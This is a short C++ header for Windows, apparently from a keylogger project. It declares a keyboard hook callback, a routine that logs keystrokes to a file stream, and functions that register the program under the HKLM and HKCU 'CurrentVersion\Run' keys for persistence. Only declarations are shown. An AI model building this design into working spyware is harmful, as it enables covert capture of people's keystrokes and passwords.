#pragma once
#include<Windows.h>
#include<iostream>
#include<fstream>
#include<string>
#include<stdio.h>
#define REGISTRY_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#pragma comment(lib,"user32.lib")
void UpdateKeyState(BYTE *keystate, int keyCode);
LRESULT CALLBACK HoockCallback(int nCode, WPARAM wParam, LPARAM lParam);
void ProcessEvent(char* lpszName, int codeNum, std::string& str, WPARAM wParam,std::ofstream &outputStream);
void AddProgramInHKEY_LOCAL_MACHINERegister(LSTATUS &status);
void AddProgramInHKEY_CURRENT_USER(LSTATUS &status);
bool CheckIfRegistryKeyExist(const LPCSTR &keyName);


